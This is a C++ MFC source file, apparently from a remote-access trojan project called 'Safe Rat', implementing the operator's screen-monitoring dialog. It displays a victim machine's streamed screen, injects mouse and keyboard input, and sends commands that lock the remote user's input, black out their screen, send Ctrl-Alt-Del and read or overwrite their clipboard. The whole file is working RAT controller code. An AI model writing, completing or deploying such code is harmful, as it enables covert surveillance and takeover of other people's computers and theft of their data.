// CScreenDlg.cpp: 实现文件
//

#include "pch.h"
#include <WinUser.h>
#include "Safe Rat.h"
#include "CScreenDlg.h"
#include "afxdialogex.h"
#include<imm.h>
// CDesktopDlg 对话框
enum
{
	IDM_SET_FLUSH = 0x0010,
	IDM_CONTROL,
	IDM_SEND_CTRL_ALT_DEL,
	IDM_TRACE_CURSOR,	// 跟踪显示远程鼠标
	IDM_BLOCK_INPUT,	// 锁定远程计算机输入
	IDM_BLANK_SCREEN,	// 黑屏
	IDM_CAPTURE_LAYER,	// 捕捉层
	IDM_SAVEDIB,		// 保存图片
	IDM_GET_CLIPBOARD,	// 获取剪贴板
	IDM_SET_CLIPBOARD,	// 设置剪贴板
};

IMPLEMENT_DYNAMIC(CScreenDlg, CDialogEx)

CScreenDlg::CScreenDlg(CWnd* pParent /*=NULL*/, CHpTcpServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(IDD_SCREEN, pParent)
{

	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_bIsFirst = true; // 如果是第一次打开对话框，显示提示等待信息
	m_lpScreenDIB = NULL;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_SPY));
	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_lpbmi = (BITMAPINFO*) new BYTE[nBISize];
	m_lpbmi_rect = (BITMAPINFO*) new BYTE[nBISize];
	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
	memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
	m_bIsCtrl = false; // 默认不控制
	m_bCursorIndex = 1;
	m_bOnClose = FALSE;
	m_nFramesPerSecond = 0;
	m_nFramesCount = 0;
	m_LastCursorIndex = 1;

	m_XvidDec.Open(m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, m_lpbmi->bmiHeader.biBitCount);
}

CScreenDlg::~CScreenDlg()
{
	DestroyIcon(m_hIcon);
}

void CScreenDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CScreenDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_WM_PAINT()
	ON_WM_SYSCOMMAND()
//	ON_WM_TIMER()
END_MESSAGE_MAP()

// CScreenDlg 消息处理程序
//保存快照
bool CScreenDlg::SaveSnapshot()
{
	CString	strFileName = m_pContext->m_RemoteIP + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.bmp"));
	CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("位图文件(*.bmp)|*.bmp|"), this);
	if (dlg.DoModal() != IDOK)
		return false;

	BITMAPFILEHEADER	hdr;
	LPBITMAPINFO		lpbi = m_lpbmi;
	CFile	file;
	if (!file.Open(dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox(_T("文件保存失败"));
		return false;
	}
	// BITMAPINFO大小
	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
	// Fill in the fields of the file header
	hdr.bfType = ((WORD)('M' << 8) | 'B');	// is always "BM"
	hdr.bfSize = lpbi->bmiHeader.biSizeImage + sizeof(hdr);
	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;
	hdr.bfOffBits = sizeof(hdr) + nbmiSize;
	// Write the file header
	file.Write(&hdr, sizeof(hdr));
	file.Write(lpbi, nbmiSize);
	// Write the DIB header and the bits
	file.Write(m_lpScreenDIB, lpbi->bmiHeader.biSizeImage);
	file.Close();
	return true;
}
//窗口关闭
void CScreenDlg::OnClose()
{
	if (m_bOnClose) return;
	m_bOnClose = TRUE;
	m_iocpServer->Disconnect(m_pContext);
	Sleep(200);
	if (m_XvidDec.m_bOpened)
		m_XvidDec.Close();
	::ReleaseDC(m_hWnd, m_hDC);
	DeleteDC(m_hMemDC);
	DeleteObject(m_hFullBitmap);

	if (m_lpbmi)
		SAFE_DELETE_AR(m_lpbmi);
	if (m_lpbmi_rect)
		SAFE_DELETE_AR(m_lpbmi_rect);
	SetClassLong(m_hWnd, GCLP_HCURSOR, (LONG)LoadCursor(NULL, IDC_ARROW));
	m_bIsCtrl = false;


	CDialogEx::OnClose();
}
//大小改变
void CScreenDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	if (!IsWindowVisible())
		return;

	GetClientRect(&rect);
	ScreenToClient(rect);
	m_wZoom = ((double)m_lpbmi->bmiHeader.biWidth) / ((double)(rect.right - rect.left));
	m_hZoom = ((double)m_lpbmi->bmiHeader.biHeight) / ((double)(rect.bottom - rect.top));
}
//数据接受处理
void CScreenDlg::OnReceiveComplete()
{
	if (m_bOnClose) 	return;
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_FIRSTSCREEN_QUICK:  
		m_bIsFirst = false;
		DrawFirstScreen();
		break;
	case TOKEN_NEXTSCREEN_QUICK:
		DrawNextScreenXvid();
		break;
	case TOKEN_BITMAPINFO:
		ResetScreen();
		break;
	case TOKEN_CLIPBOARD_TEXT_QUICK:
		UpdateLocalClipboard((char*)m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
		break;
	case TOKEN_SIZE_QUICK:
		memcpy(&m_rect, m_pContext->m_DeCompressionBuffer.GetBuffer() + 1, sizeof(RECT));
		return;
	default:
		return;
	}

}

BOOL CScreenDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	CString str;
	str.Format("%s - 屏幕监控 (%d * %d)", m_pContext->m_RemoteIP, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
	SetWindowText(str); 

	SetClassLongA(m_hWnd, GCLP_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_FLUSH, _T("刷新(&F)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, _T("控制屏幕(&Y)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SEND_CTRL_ALT_DEL, _T("发送Ctrl-Alt-Del(&K)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, _T("跟踪服务端鼠标(&T)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, _T("锁定服务端鼠标和键盘(&L)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_BLANK_SCREEN, _T("服务端黑屏(&B)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_CAPTURE_LAYER, _T("捕捉层(导致鼠标闪烁)(&L)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("保存快照(&S)"));
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, _T("获取剪贴板(&R)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, _T("设置剪贴板(&L)"));
		pSysMenu->AppendMenu(MF_SEPARATOR);
	}

	m_hRemoteCursor = LoadCursor(NULL, IDC_ARROW);
	ICONINFO CursorInfo;
	::GetIconInfo(m_hRemoteCursor, &CursorInfo);
	if (CursorInfo.hbmMask != NULL)
		::DeleteObject(CursorInfo.hbmMask);
	if (CursorInfo.hbmColor != NULL)
		::DeleteObject(CursorInfo.hbmColor);
	m_dwCursor_xHotspot = CursorInfo.xHotspot;
	m_dwCursor_yHotspot = CursorInfo.yHotspot;
	m_RemoteCursorPos.x = 0;
	m_RemoteCursorPos.x = 0;
	m_bIsTraceCursor = false;
	// 初始化窗口大小结构
	m_hDC = ::GetDC(m_hWnd);
	m_hMemDC = CreateCompatibleDC(m_hDC);
	m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
	SelectObject(m_hMemDC, m_hFullBitmap);
	SetStretchBltMode(m_hDC, STRETCH_HALFTONE);
	SetStretchBltMode(m_hMemDC, STRETCH_HALFTONE);
	GetClientRect(&rect);
	ScreenToClient(rect);
	m_wZoom = ((double)m_lpbmi->bmiHeader.biWidth) / ((double)(rect.right - rect.left));
	m_hZoom = ((double)m_lpbmi->bmiHeader.biHeight) / ((double)(rect.bottom - rect.top));

	SetStretchBltMode(m_hDC, STRETCH_HALFTONE);
	SendNext();
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}

void CScreenDlg::ResetScreen()
{
	Sleep(1000);
	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	if (m_lpbmi != NULL)
	{
		SAFE_DELETE_AR(m_lpbmi);
		SAFE_DELETE_AR(m_lpbmi_rect);
		m_lpbmi = (BITMAPINFO*) new BYTE[nBISize];
		m_lpbmi_rect = (BITMAPINFO*) new BYTE[nBISize];
		memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
		memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
		DeleteObject(m_hFullBitmap);
		m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
		SelectObject(m_hMemDC, m_hFullBitmap);
		SetStretchBltMode(m_hDC, STRETCH_HALFTONE);
		SetStretchBltMode(m_hMemDC, STRETCH_HALFTONE);
		GetClientRect(&rect);
		ScreenToClient(rect);
		m_wZoom = ((double)m_lpbmi->bmiHeader.biWidth) / ((double)(rect.right - rect.left));
		m_hZoom = ((double)m_lpbmi->bmiHeader.biHeight) / ((double)(rect.bottom - rect.top));
		m_XvidDec.Close();
		m_XvidDec.Open(m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, m_lpbmi->bmiHeader.biBitCount);

	}
}


void CScreenDlg::SendResetScreen(int	nBitCount)
{
	BYTE	bBuff[2];
	bBuff[0] = COMMAND_SCREEN_RESET_QUICK;
	bBuff[1] = nBitCount;
	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
}

void CScreenDlg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnClose();

	CDialogEx::PostNcDestroy();
	delete this;
}

//消息获取
BOOL CScreenDlg::PreTranslateMessage(MSG* pMsg)
{

	switch (pMsg->message)
	{
	case WM_MOUSEMOVE:
		if (GetKeyState(VK_SCROLL) & 0x0001) 
		{
			CRect ClientRect;
			GetClientRect(ClientRect);

			int nHScrollPos = (float)m_lpbmi->bmiHeader.biWidth / ClientRect.Width() * LOWORD(pMsg->lParam);
			int nVScrollPos = (float)m_lpbmi->bmiHeader.biHeight / ClientRect.Height() *  HIWORD(pMsg->lParam);
			SCROLLBARINFO sbi; int nMinPos, nMaxPos;
			sbi.cbSize = sizeof(SCROLLBARINFO);
			GetScrollBarInfo(OBJID_HSCROLL, &sbi);
			if (!(sbi.rgstate[0] & STATE_SYSTEM_INVISIBLE))
			{
				GetScrollRange(SB_HORZ, &nMinPos, &nMaxPos);
				if (nHScrollPos > nMaxPos)
					nHScrollPos = nMaxPos;
				PostMessage(WM_HSCROLL, MAKEWPARAM(SB_THUMBTRACK, nHScrollPos), NULL);
			}
			GetScrollBarInfo(OBJID_VSCROLL, &sbi);
			if (!(sbi.rgstate[0] & STATE_SYSTEM_INVISIBLE))
			{
				GetScrollRange(SB_VERT, &nMinPos, &nMaxPos);
				if (nVScrollPos > nMaxPos)
					nVScrollPos = nMaxPos;
				PostMessage(WM_VSCROLL, MAKEWPARAM(SB_THUMBTRACK, nVScrollPos), NULL);
			}

			ClientToScreen(ClientRect);
			ClipCursor(ClientRect);
		}
		else
		{
			ClipCursor(NULL);
		}
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_LBUTTONDBLCLK:
	case WM_RBUTTONDBLCLK:
	case WM_MBUTTONDOWN:
	case WM_MBUTTONUP:
	case WM_MBUTTONDBLCLK:
	case WM_MOUSEWHEEL:
		{
			MSG	msg;
			memcpy(&msg, pMsg, sizeof(MSG));
			int xPos = (int)(short)LOWORD(pMsg->lParam) + GetScrollPos(SB_HORZ);
			int yPos = (int)(short)HIWORD(pMsg->lParam) + GetScrollPos(SB_VERT);
			msg.lParam = MAKELPARAM(xPos, yPos);


			msg.lParam = MAKELPARAM(xPos * m_lpbmi->bmiHeader.biWidth / rect.Width(), yPos * m_lpbmi->bmiHeader.biHeight / rect.Height());
			msg.pt.x = xPos * m_lpbmi->bmiHeader.biWidth / rect.Width();
			msg.pt.y = yPos * m_lpbmi->bmiHeader.biHeight / rect.Height();
			SendCommand(&msg);

		}
		break;
	case WM_KEYDOWN:
		if (pMsg->wParam == VK_RETURN && GetKeyState(VK_CONTROL)&0x8000 && GetKeyState(VK_MENU)&0x8000)
		{
			if (GetKeyState(VK_SCROLL) & 0x0001)
			{
				CRect ClientRect;
				GetClientRect(ClientRect);
				ClientToScreen(ClientRect);
				ClipCursor(ClientRect);
			}
			return TRUE;
		}
	case WM_KEYUP:
		if (pMsg->wParam == VK_RETURN && GetKeyState(VK_CONTROL)&0x8000 && GetKeyState(VK_MENU)&0x8000)
		{
			return TRUE;
		}
	case WM_SYSKEYUP:
		if (pMsg->wParam == VK_F11) // F11: 退出全屏
			return TRUE;
	case WM_SYSKEYDOWN:
		if (pMsg->wParam != VK_SCROLL)
		{
			MSG	msg;
			memcpy(&msg, pMsg, sizeof(MSG));
			ScreenToClient(&msg.pt);
			msg.pt.x += GetScrollPos(SB_HORZ);
			msg.pt.y += GetScrollPos(SB_VERT);
			SendCommand(&msg);
			if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_F4)
				return TRUE;
		}
		if (pMsg->wParam == VK_SCROLL)
		{
			if (GetKeyState(VK_SCROLL) & 0x0001)
			{
				CRect ClientRect;
				GetClientRect(ClientRect);
				ClientToScreen(ClientRect);
				ClipCursor(ClientRect);
			}
			else ClipCursor(NULL);
		}


		break;
	default:
		break;
	}

	//switch (pMsg->message)
	//{
	//case WM_MOUSEMOVE:
	//case WM_LBUTTONDOWN:
	//case WM_LBUTTONUP:
	//case WM_RBUTTONDOWN:
	//case WM_RBUTTONUP:
	//case WM_LBUTTONDBLCLK:
	//case WM_RBUTTONDBLCLK:
	//case WM_MBUTTONDOWN:
	//case WM_MBUTTONUP:
	//case WM_MBUTTONDBLCLK:
	//case WM_MOUSEWHEEL:
	//{
	//	MSG	msg;
	//	memcpy(&msg, pMsg, sizeof(MSG));
	//	int xPos = (int)(short)LOWORD(pMsg->lParam) + GetScrollPos(SB_HORZ);
	//	int yPos = (int)(short)HIWORD(pMsg->lParam) + GetScrollPos(SB_VERT);
	//	msg.lParam = MAKELPARAM(xPos, yPos);

	//	msg.lParam = MAKELPARAM(xPos * m_lpbmi->bmiHeader.biWidth / rect.Width(), yPos * m_lpbmi->bmiHeader.biHeight / rect.Height());
	//	msg.pt.x = xPos * m_lpbmi->bmiHeader.biWidth / rect.Width();
	//	msg.pt.y = yPos * m_lpbmi->bmiHeader.biHeight / rect.Height();
	//	
	//	LPBYTE lpData = new BYTE[sizeof(MSG) + 1];
	//	lpData[0] = COMMAND_SCREEN_CONTROL_QUICK;
	//	memcpy(lpData + 1, &msg, sizeof(MSG));
	//	m_iocpServer->Send(m_pContext, lpData, sizeof(MSG) + 1);
	//	SAFE_DELETE_AR(lpData);

	//}
	//break;

	//case WM_KEYDOWN:
	//	break;
	//case WM_KEYUP:
	//	return TRUE;
	//case WM_SYSKEYUP:
	//	return TRUE;
	//case WM_SYSKEYDOWN:
	//	if (pMsg->wParam != VK_SCROLL)
	//	{
	//		MSG	msg;
	//		memcpy(&msg, pMsg, sizeof(MSG));
	//		ScreenToClient(&msg.pt);
	//		msg.pt.x += GetScrollPos(SB_HORZ);
	//		msg.pt.y += GetScrollPos(SB_VERT);

	//		LPBYTE lpData = new BYTE[sizeof(MSG) + 1];
	//		lpData[0] = COMMAND_SCREEN_CONTROL_QUICK;
	//		memcpy(lpData + 1, &msg, sizeof(MSG));
	//		m_iocpServer->Send(m_pContext, lpData, sizeof(MSG) + 1);
	//		SAFE_DELETE_AR(lpData);

	//		if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_F4)
	//			return TRUE;
	//	}
	//	break;
	//default:
	//	break;
	//}

	return CDialog::PreTranslateMessage(pMsg);
}




//渲染第一张
void CScreenDlg::DrawFirstScreen()
{
	bool	bIsReDraw = false;
	LPVOID	lpFirstScreen = m_pContext->m_DeCompressionBuffer.GetBuffer(1);
	DWORD	dwFirstLength = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;

	if (m_XvidDec.Decode(lpFirstScreen, dwFirstLength, m_lpScreenDIB) > 0)
		bIsReDraw = true;

	m_bIsFirst = false;
	if (bIsReDraw)
	{
#ifdef _DEBUG
		SendNotifyMessage(WM_PAINT, NULL, NULL);
#else
		OnPaint();
#endif // _DEBUG
	}
}
//渲染其余的
void CScreenDlg::DrawNextScreenXvid()
{
	++m_nFramesCount;
	// 根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标, 防止鼠标闪烁
	bool	bIsReDraw = false;
	int		nHeadLength = 1 + sizeof(POINT) + sizeof(BYTE); // 标识[1]  + 光标位置[8] + 光标类型索引[1]
	LPVOID	lpLastScreen = m_lpScreenDIB;
	LPVOID	lpNextScreen = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);
	DWORD	dwNextLength = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;

	// 判断鼠标是否移动
	LPPOINT	lpNextCursorPos = (LPPOINT)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
	if (memcmp(lpNextCursorPos, &m_RemoteCursorPos, sizeof(POINT)) != 0 && m_bIsTraceCursor)
	{
		bIsReDraw = true;
		memcpy(&m_RemoteCursorPos, lpNextCursorPos, sizeof(POINT));
	}

	// 光标类型发生变化
	int	nOldCursorIndex = m_bCursorIndex;
	m_bCursorIndex = m_pContext->m_DeCompressionBuffer.GetBuffer(9)[0];
	if (nOldCursorIndex != m_bCursorIndex)
	{
		bIsReDraw = true;
		if (m_bIsCtrl && !m_bIsTraceCursor)
			SetClassLong(m_hWnd, GCLP_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
	}

	// 屏幕数据是否变化
	if (dwNextLength > 0)
	{
		bIsReDraw = true;
		m_XvidDec.Decode(lpNextScreen, dwNextLength, lpLastScreen);
	}

	if (bIsReDraw)
	{
#ifdef _DEBUG
		SendNotifyMessage(WM_PAINT, NULL, NULL);
#else
		OnPaint();
#endif // _DEBUG
	}
}

//渲染
void CScreenDlg::OnPaint()
{
	CPaintDC dc(this);

	if (m_bIsFirst)
	{
		DrawTipString(_T("Please wait - initial screen loading"));
		return;
	}
	if (m_bOnClose) return;

	StretchBlt(m_hDC, 0, 0, rect.Width(), rect.Height(), m_hMemDC, 0, 0, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, SRCCOPY);
	if (m_bIsTraceCursor)
		DrawIconEx(
			m_hDC,									// handle to device context 
			(int)((float)m_RemoteCursorPos.x / m_wZoom),
			(int)((float)m_RemoteCursorPos.y / m_hZoom),
			m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex),	// handle to icon to draw 
			0, 0,										// width of the icon 
			0,											// index of frame in animated cursor 
			NULL,										// handle to background brush 
			DI_NORMAL | DI_COMPAT						// icon-drawing flags 
		);
}


//点击了菜单
void CScreenDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case SC_MONITORPOWER: // 拦截显示器节电自动关闭的消息
		return;
	case SC_SCREENSAVE:   // 拦截屏幕保护启动的消息
		return;
	case IDM_SET_FLUSH:
	{
		BYTE	bToken = COMMAND_FLUSH_QUICK;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	break;
	case IDM_CONTROL:
	{
		m_bIsCtrl = !m_bIsCtrl;
		pSysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);

		if (m_bIsCtrl)
		{
			if (m_bIsTraceCursor)
				SetClassLong(m_hWnd, GCLP_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
			else
				SetClassLong(m_hWnd, GCLP_HCURSOR, (LONG)m_hRemoteCursor);
		}
		else
			SetClassLong(m_hWnd, GCLP_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	}
	break;
	case IDM_SEND_CTRL_ALT_DEL:
	{
		BYTE	bToken = COMMAND_SCREEN_CTRL_ALT_DEL_QUICK;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	break;
	case IDM_TRACE_CURSOR: // 跟踪服务端鼠标
	{
		m_bIsTraceCursor = !m_bIsTraceCursor;
		pSysMenu->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);
		if (m_bIsCtrl)
		{
			if (!m_bIsTraceCursor)
				SetClassLong(m_hWnd, GCLP_HCURSOR, (LONG)m_hRemoteCursor);
			else
				SetClassLong(m_hWnd, GCLP_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
		}
		// 重绘消除或显示鼠标
		PostMessage(WM_PAINT);
	}
	break;
	case IDM_BLOCK_INPUT: // 锁定服务端鼠标和键盘
	{
		bool bIsChecked = (pSysMenu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED) ? true : false;
		pSysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

		BYTE	bToken[2];
		bToken[0] = COMMAND_SCREEN_BLOCK_INPUT_QUICK;
		bToken[1] = !bIsChecked;
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
	break;
	case IDM_BLANK_SCREEN: // 服务端黑屏
	{
		bool bIsChecked = (pSysMenu->GetMenuState(IDM_BLANK_SCREEN, MF_BYCOMMAND) & MF_CHECKED) ? true : false;
		pSysMenu->CheckMenuItem(IDM_BLANK_SCREEN, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

		BYTE	bToken[2];
		bToken[0] = COMMAND_SCREEN_BLANK_QUICK;
		bToken[1] = !bIsChecked;
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
	break;
	case IDM_CAPTURE_LAYER: // 捕捉层
	{
		bool bIsChecked = (pSysMenu->GetMenuState(IDM_CAPTURE_LAYER, MF_BYCOMMAND) & MF_CHECKED) ? true : false;
		pSysMenu->CheckMenuItem(IDM_CAPTURE_LAYER, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

		BYTE	bToken[2];
		bToken[0] = COMMAND_SCREEN_CAPTURE_LAYER_QUICK;
		bToken[1] = !bIsChecked;
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
	break;
	case IDM_SAVEDIB:
		SaveSnapshot();
		break;
	case IDM_GET_CLIPBOARD: // 获取剪贴板
	{
		BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD_QUICK;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
	}
	break;
	case IDM_SET_CLIPBOARD: // 设置剪贴板
	{
		SendLocalClipboard();
	}
	break;
	default:
		CDialog::OnSysCommand(nID, lParam);
	}
}
void CScreenDlg::DrawTipString(CString str)
{
	RECT rect;
	GetClientRect(&rect);
	COLORREF bgcol = RGB(0x00, 0x00, 0x00);
	COLORREF oldbgcol = SetBkColor(m_hDC, bgcol);
	COLORREF oldtxtcol = SetTextColor(m_hDC, RGB(0xff, 0x00, 0x00));
	ExtTextOut(m_hDC, 0, 0, ETO_OPAQUE, &rect, NULL, 0, NULL);

	DrawText(m_hDC, str, -1, &rect,
		DT_SINGLELINE | DT_CENTER | DT_VCENTER);

	SetBkColor(m_hDC, oldbgcol);
	SetTextColor(m_hDC, oldtxtcol);

}
//发送消息
void CScreenDlg::SendCommand(MSG* pMsg)
{
	if (!m_bIsCtrl)
		return;

	LPBYTE lpData = new BYTE[sizeof(MSG) + 1];
	lpData[0] = COMMAND_SCREEN_CONTROL_QUICK;
	memcpy(lpData + 1, pMsg, sizeof(MSG));
	m_iocpServer->Send(m_pContext, lpData, sizeof(MSG) + 1);

	SAFE_DELETE_AR(lpData);
}

//更新剪切板
void CScreenDlg::UpdateLocalClipboard(char* buf, int len)
{
	if (!::OpenClipboard(NULL))
		return;

	::EmptyClipboard();
	HGLOBAL hglbCopy = ::GlobalAlloc(GMEM_MOVEABLE, len);
	if (hglbCopy != NULL) {
		LPTSTR lptstrCopy = (LPTSTR)::GlobalLock(hglbCopy);
		memcpy(lptstrCopy, buf, len);
		::GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		::SetClipboardData(CF_TEXT, hglbCopy);
		::GlobalFree(hglbCopy);
	}
	::CloseClipboard();
}

//发送自己的剪切板数据
void CScreenDlg::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR)GlobalLock(hglb);
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = COMMAND_SCREEN_SET_CLIPBOARD_QUICK;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb);
	::CloseClipboard();
	m_iocpServer->Send(m_pContext, lpData, nPacketLen);
	delete[] lpData;
}

//通知对话框已经打开
void CScreenDlg::SendNext()
{
	BYTE	bBuff = COMMAND_NEXT_QUICK;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}
//消息回调
LRESULT CScreenDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
{
	// TODO: Add your specialized code here and/or call the base class
	if (message == WM_POWERBROADCAST && wParam == PBT_APMQUERYSUSPEND)
	{
		return BROADCAST_QUERY_DENY; // 拦截系统待机, 休眠的请求
	}
	if (message == WM_ACTIVATE && LOWORD(wParam) != WA_INACTIVE && !HIWORD(wParam))
	{
		SetWindowPos(&wndTopMost, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		return TRUE;
	}
	if (message == WM_ACTIVATE && LOWORD(wParam) == WA_INACTIVE)
	{
		SetWindowPos(&wndNoTopMost, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		return TRUE;
	}

	return CDialog::WindowProc(message, wParam, lParam);
}


